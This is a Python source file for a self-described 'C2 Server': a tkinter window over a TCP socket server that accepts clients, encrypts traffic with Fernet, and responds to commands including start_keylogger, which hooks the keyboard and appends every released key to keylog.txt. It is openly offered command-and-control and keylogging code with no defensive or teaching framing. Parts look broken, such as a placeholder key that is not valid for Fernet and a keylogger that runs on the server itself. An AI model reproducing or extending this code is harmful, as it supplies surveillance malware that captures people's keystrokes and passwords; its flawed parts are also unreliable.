import socket
import tkinter as tk
from tkinter import scrolledtext
import threading
from cryptography.fernet import Fernet
import os
import keyboard  # Install the 'keyboard' library using pip

# Define a secret key for encryption (replace with your own secret key)
SECRET_KEY = b'your_secret_key_here'
cipher_suite = Fernet(SECRET_KEY)

# Define the server's address and port
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 12345

# Create a socket object
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the server address and port
server_socket.bind((SERVER_HOST, SERVER_PORT))

# Listen for incoming connections
server_socket.listen(5)

print(f"Server is listening on {SERVER_HOST}:{SERVER_PORT}")

# Initialize tkinter
root = tk.Tk()
root.title("C2 Server")

# Create a scrolled text widget to display logs
log_text = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=40, height=20)
log_text.pack()

# Create a list to store connected clients
connected_clients = []

# Function to append text to the log
def append_log(text):
    log_text.insert(tk.END, text + "\n")
    log_text.see(tk.END)

# Function to broadcast a message to all connected clients
def broadcast_message(message):
    for client in connected_clients:
        try:
            client.send(encrypt_message(message))
        except Exception as e:
            append_log(f"Error broadcasting message: {str(e)}")

# Function to handle a client's connection
def handle_client(client_socket):
    connected_clients.append(client_socket)
    append_log(f"Accepted connection from {client_socket.getpeername()}")

    while True:
        try:
            encrypted_data = client_socket.recv(1024)
            if not encrypted_data:
                break
            data = decrypt_message(encrypted_data)
            append_log(f"Received from {client_socket.getpeername()}: {data}")

            # Process the received command
            response = process_command(data)

            if response:
                client_socket.send(encrypt_message(response))
        except Exception as e:
            append_log(f"Error handling client: {str(e)}")
            break

    # Remove the client from the list and close the socket
    connected_clients.remove(client_socket)
    client_socket.close()
    append_log(f"Connection with {client_socket.getpeername()} closed")

# Function to encrypt a message
def encrypt_message(message):
    return cipher_suite.encrypt(message.encode())

# Function to decrypt a message
def decrypt_message(encrypted_message):
    return cipher_suite.decrypt(encrypted_message).decode()

# Function to process commands from clients
def process_command(command):
    try:
        command = command.strip()
        if command.lower() == "list_clients":
            return "\n".join([str(client.getpeername()) for client in connected_clients])
        elif command.lower() == "exit":
            return "Goodbye!"
        elif command.lower() == "help":
            return "Available commands: list_clients, exit, help"
        elif command.lower() == "start_keylogger":
            start_keylogger()
            return "Keylogger started."
        elif command.lower() == "stop_keylogger":
            stop_keylogger()
            return "Keylogger stopped."
        else:
            return "Unknown command. Type 'help' for available commands."
    except Exception as e:
        return str(e)

# Function to start accepting connections from clients
def start_server():
    while True:
        client_socket, client_address = server_socket.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

# Function to start the keylogger
def start_keylogger():
    keyboard.on_release(callback=handle_key_event)

# Function to stop the keylogger
def stop_keylogger():
    keyboard.unhook_all()

# Function to handle key events (keylogger)
def handle_key_event(event):
    try:
        key = event.name
        with open("keylog.txt", "a") as log_file:
            log_file.write(key + "\n")
    except Exception as e:
        append_log(f"Error handling key event: {str(e)}")

# Don't forget to close the sockets when done
def on_closing():
    for client in connected_clients:
        client.close()
    server_socket.close()
    root.destroy()

root.protocol("WM_DELETE_WINDOW", on_closing)

# Start accepting connections in a separate thread
server_thread = threading.Thread(target=start_server)
server_thread.start()

root.mainloop()
